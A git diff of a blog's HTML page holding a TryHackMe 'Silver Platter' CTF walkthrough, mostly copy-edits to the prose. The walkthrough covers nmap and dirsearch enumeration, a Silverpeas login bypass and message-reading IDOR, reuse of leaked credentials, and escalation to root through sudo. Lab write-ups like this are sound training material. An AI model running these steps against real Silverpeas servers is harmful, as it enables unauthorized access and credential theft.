@@ -7,7 +7,7 @@
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="CTF Silver Platter - TryHackMe 24-03-2025
-Starting with nmap  scanning target to identify open ports  $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
+Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
 # Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96 Warning: 10.10.126.96 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.126.96 Host is up (0.21s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12." />
 <meta name="keywords" content="" />
 
@@ -81,7 +81,7 @@ Starting with nmap  scanning target to identify open ports  $sudo nmap -T5 -Pn -
 <meta property="og:type" content="article" />
 <meta property="og:title" content="">
 <meta property="og:description" content="CTF Silver Platter - TryHackMe 24-03-2025
-Starting with nmap  scanning target to identify open ports  $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
+Starting with nmap  Scanning the target to identify open ports  $sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96
 # Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96 Warning: 10.10.126.96 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.126.96 Host is up (0.21s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12." />
 <meta property="og:url" content="/posts/ctf/thm/silverplatter/" />
 <meta property="og:site_name" content="MrFCode Blog" />
@@ -183,7 +183,7 @@ Starting with nmap  scanning target to identify open ports  $sudo nmap -T5 -Pn -
 <p>24-03-2025</p>
 <h2 id="starting-with-nmap">Starting with nmap<a href="#starting-with-nmap" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
-<li>scanning target to identify open ports</li>
+<li>Scanning the target to identify open ports</li>
 </ul>
 <p><code>$sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96</code></p>
 <pre tabindex="0"><code class="language-output" data-lang="output"># Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96
@@ -199,9 +199,9 @@ PORT     STATE SERVICE
 # Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12.61 seconds
 
 </code></pre><ul>
-<li>We have port 22/tcp,80/tcp,8080/tcp open.</li>
+<li>We have port 22/tcp,80/tcp and 8080/tcp open.</li>
 </ul>
-<h2 id="scanning-more-in-depth-on-the-target">Scanning more in depth on the target<a href="#scanning-more-in-depth-on-the-target" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="scanning-more-in-depth-on-the-target">Scanning more in-depth on the target<a href="#scanning-more-in-depth-on-the-target" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p><code>$sudo nmap -sVC -Pn -T5 -p 80,22,8080 -oN nmap/deep 10.10.126.96</code></p>
 <pre tabindex="0"><code class="language-output" data-lang="output">
 # Nmap 7.94SVN scan initiated Mon Mar 24 07:00:31 2025 as: nmap -sVC -Pn -T5 -p 80,22,8080 -oN nmap/deep 10.10.126.96
@@ -307,15 +307,13 @@ IP[10.10.126.96],
 JQuery, Script, Title[Hack Smarter Security], 
 nginx[1.18.0]
 
-</code></pre><p>After a while brute-forcing pages on the site.
-I tried to scrap the words on the site using cewl to create a custom wordlist and saved into a file:</p>
+</code></pre><p>After a while, brute-forcing directories and files in the web server. I tried to scrape the words on the site using cewl to create a custom word list and saved it into a file:</p>
 <p><code>$cewl http://10.10.126.96 &gt; wordlist</code></p>
 <ul>
-<li>Remove the empty lines in the wordlist file</li>
+<li>Remove the empty lines in the wordlist file.</li>
 </ul>
-<p>but still after using that wordlist there no pages found so I tried to convert every single word in the list into lower case to check if I can find anything
-so I use python to convert all the lines into lower case:</p>
-<pre tabindex="0"><code class="language-Convert" data-lang="Convert">#!/usr/bin/python3
+<p>But still, after using that word list, there were no pages found, so I tried to convert every single word in the list into lowercase to check if I could find anything, so I used Python to convert all the lines into lowercase.</p>
+<pre tabindex="0"><code class="language-convert" data-lang="convert">#!/usr/bin/python3
 
 limit = 248 # This is the number of lines we want to convert into lower case
 count = 0 # initialized an count variable
@@ -335,11 +333,11 @@ while count &lt;= limit: # Creating a loop with an condition
         count += 1
 
 
-</code></pre><p>Then run the code and save it into another file</p>
+</code></pre><p>Then run the code and save it into another file.</p>
 <p><code>$python3 converter.py &gt; wordlist.txt</code></p>
 <h2 id="now-checking-the-website-pages-on-port-8080tcp-with-the-wordlist">Now checking the website pages on port 8080/tcp with the wordlist:<a href="#now-checking-the-website-pages-on-port-8080tcp-with-the-wordlist" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p><code>$dirsearch -u  http://10.10.126.96:8080 -w wordlist.txt</code></p>
-<h3 id="here-we-go-there-are-an-page-found">Here we go, there are an page found<a href="#here-we-go-there-are-an-page-found" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h3 id="here-we-go-there-is-a-page-found">Here we go; there is a page found.<a href="#here-we-go-there-is-a-page-found" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <pre tabindex="0"><code class="language-output" data-lang="output">
 dirsearch -u http://`cat ip.txt`:8080 -w wordlist.txt 
 
@@ -357,22 +355,22 @@ Target: http://10.10.126.96:8080/
 
 Task Completed
 
-</code></pre><h2 id="after-opening-the-page-discovered-that-it-was-an-login-page">After opening the page, discovered that it was an login page<a href="#after-opening-the-page-discovered-that-it-was-an-login-page" class="hanchor" ariaLabel="Anchor">#</a> </h2>
-<p>It was silverpeas login page, and after google for the default credential for that site,
-I found that there was an cve for bypass the login <a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d">CVE-2024-36042</a>
-Also by default the admin name in silverpeas is SilverAdmin, found from google seach. So by connecting this dots we can login to the admin account using the CVE login bypass.</p>
-<h3 id="found-some-more-cve-for-the-silverpeas-634--635-fixed">Found some more CVE for the Silverpeas 6.3.4 &lt; 6.3.5 Fixed<a href="#found-some-more-cve-for-the-silverpeas-634--635-fixed" class="hanchor" ariaLabel="Anchor">#</a> </h3>
-<p><a href="https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/">https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/</a>
-CVE-2023-47323
-CVE-2023-47321
-CVE-2023-47320
-CVE-2023-47324
-CVE-2023-47325
-CVE-2023-47326
-CVE-2023-47327</p>
-<h2 id="this-one-seems-interesting-cve-2023-323">This one seems interesting CVE-2023-323:<a href="#this-one-seems-interesting-cve-2023-323" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+</code></pre><h2 id="after-opening-the-page-i-discovered-that-it-was-a-login-page">After opening the page, I discovered that it was a login page.<a href="#after-opening-the-page-i-discovered-that-it-was-a-login-page" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>It was Silverpeas login page, and after Googling for the default credential for that site, I found that there was a CVE for bypassing the login, <a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d">CVE-2024-36042</a>. Also by default, the admin name in Silverpeas is SilverAdmin, found from a Google <a href="https://sdl.ist.osaka-u.ac.jp/~h-azuma/satd-docker/scrape/silverpeas.html">search</a>. So by connecting these dots, we can login to the admin account using the CVE login bypass.</p>
+<h3 id="found-some-more-cves-for-the-silverpeas-634--635">Found some more CVEs for the Silverpeas 6.3.4 &lt; 6.3.5.<a href="#found-some-more-cves-for-the-silverpeas-634--635" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><a href="https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/">https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/</a></p>
 <ul>
-<li>Broken access control allows attacker to read all messages</li>
+<li>CVE-2023-47323</li>
+<li>CVE-2023-47321</li>
+<li>CVE-2023-47320</li>
+<li>CVE-2023-47324</li>
+<li>CVE-2023-47325</li>
+<li>CVE-2023-47326</li>
+<li>CVE-2023-47327</li>
+</ul>
+<h2 id="this-one-seems-interesting-cve-2023-323">This one seems interesting: CVE-2023-323.<a href="#this-one-seems-interesting-cve-2023-323" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Broken access control allows attackers to read all messages.</li>
 </ul>
 <pre tabindex="0"><code class="language-proof-of-concept" data-lang="proof-of-concept">
 Description
@@ -381,7 +379,7 @@ The notification/messaging feature of Silverpeas Core 6.3.1 does not enforce acc
 Usage/Exploitation
 To exploit this vulnerability, an attacker can use a script or Burp Suite Intruder to view all messages by attacking the ID parameter in this URL: http://localhost:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID] - the messages begin at &quot;1&quot; and increase in intervals of 1.
 
-</code></pre><h2 id="after-reading-the-messages-one-by-one-found-an-interesting-information-on-the-6th-message">After reading the messages one by one found an interesting information on the 6th message:<a href="#after-reading-the-messages-one-by-one-found-an-interesting-information-on-the-6th-message" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+</code></pre><h2 id="after-reading-the-messages-one-by-one-i-found-interesting-information-in-the-6th-message">After reading the messages one by one, I found interesting information in the 6th message:<a href="#after-reading-the-messages-one-by-one-i-found-interesting-information-in-the-6th-message" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>http://10.10.151.252:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6</li>
 </ul>
@@ -392,17 +390,17 @@ Username: tim
 
 Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 
-</code></pre><p>With this we can ssh into the server.</p>
+</code></pre><p>With this we can SSH into the server.</p>
 <h4 id="using-the-ssh-credential">using the SSH credential:<a href="#using-the-ssh-credential" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <ul>
 <li>tim</li>
 <li>c4ca4238a0b923820dcc509a6f75849b</li>
 </ul>
 <p><code>ssh tim@10.10.126.96</code></p>
-<p>After login we got the user flag.</p>
-<h2 id="now-time-to-escalate-privileges">Now time to escalate privileges<a href="#now-time-to-escalate-privileges" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>After logging in, we got the user flag.</p>
+<h2 id="now-its-time-to-escalate-privileges">Now it&rsquo;s time to escalate privileges.<a href="#now-its-time-to-escalate-privileges" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
-<li>After looking around the logs at <code>auth.log.*</code>, found postgress docker container info:</li>
+<li>After looking around the logs at <code>auth.log.*</code>, I found postgress docker container info:</li>
 </ul>
 <pre tabindex="0"><code class="language-auth.log.*" data-lang="auth.log.*">usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
 </code></pre><ul>
@@ -410,9 +408,9 @@ Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 </ul>
 <pre tabindex="0"><code>$su tyler
 Password.=_Zd_zx7N823/
-</code></pre><h3 id="successfully-logged-into-tyler-account">Successfully logged into tyler account<a href="#successfully-logged-into-tyler-account" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+</code></pre><h3 id="successfully-logged-into-tylers-account">Successfully logged into tyler&rsquo;s account<a href="#successfully-logged-into-tylers-account" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
-<li>Checked if the user can run sudo and found that this user can run all command using sudo :</li>
+<li>Checked if the user can run sudo and found that this user can run all commands using sudo :</li>
 </ul>
 <pre tabindex="0"><code>$sudo -l
 [sudo] password for tyler: 
@@ -427,7 +425,7 @@ User tyler may run the following commands on silver-platter:
 
 </code></pre><h2 id="got-root-access-by-entering-sudo-su">Got root access by entering <code>sudo su</code><a href="#got-root-access-by-entering-sudo-su" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
-<li>found root flag at root</li>
+<li>Found root flag at root directory.</li>
 </ul>
 
       </div></div>
@@ -446,6 +444,12 @@ User tyler may run the following commands on silver-platter:
       </a>
     
     
+      ::
+    
+    
+      <a href="/posts/docker101/" class="button inline next">
+         [<span class="button__text"></span>] &gt;
+      </a>
     
   </div>
 </div>
